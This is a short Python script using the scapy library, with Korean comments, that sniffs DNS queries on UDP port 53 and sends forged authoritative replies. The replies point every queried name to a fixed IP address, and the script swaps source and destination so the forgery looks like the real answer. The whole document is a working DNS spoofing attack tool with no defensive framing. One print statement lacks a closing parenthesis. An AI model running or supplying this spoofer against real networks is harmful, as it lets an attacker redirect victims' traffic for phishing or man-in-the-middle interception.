#DNS 응답 목적지 IP 주소 -> 가로챈 DNS 쿼리패킷의 발신지 IP 주소
#DNS 발신지 IP 주소 -> 가로챈 DNS 쿼리패킷의 목적지 IP 주소
#내가 보내는 변조된 패킷이 제대로 된 응답으로 보이게 하기 위함
from scapy.all import *

def dnsSpoof(packet):
	spoofDNS = '172.21.70.227'
	dstip = packet[IP].src
	srcip = packet[IP].dst
	sport = packet[UDP].sport
	dport = packet[UDP].dport
	
	if packet.haslayer(DNSQR):
		dnsid = packet[DNS].id
		qd = packet[DNS].qd
		#DNSRR의 rdata : DNS 응답 레코드
		dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
		
		spoofPacket = IP(dst=dstip, src=srcip)/UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
		
		send(spoofPacket)
		
		print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip)
		print(spoofPacket.summary())
	
	
def main():
	print('+++DNS SPOOF START...')
	sniff(filter='udp port 53', store=0, prn=dnsSpoof)
	
	
if __name__ == '__main__':
	main()
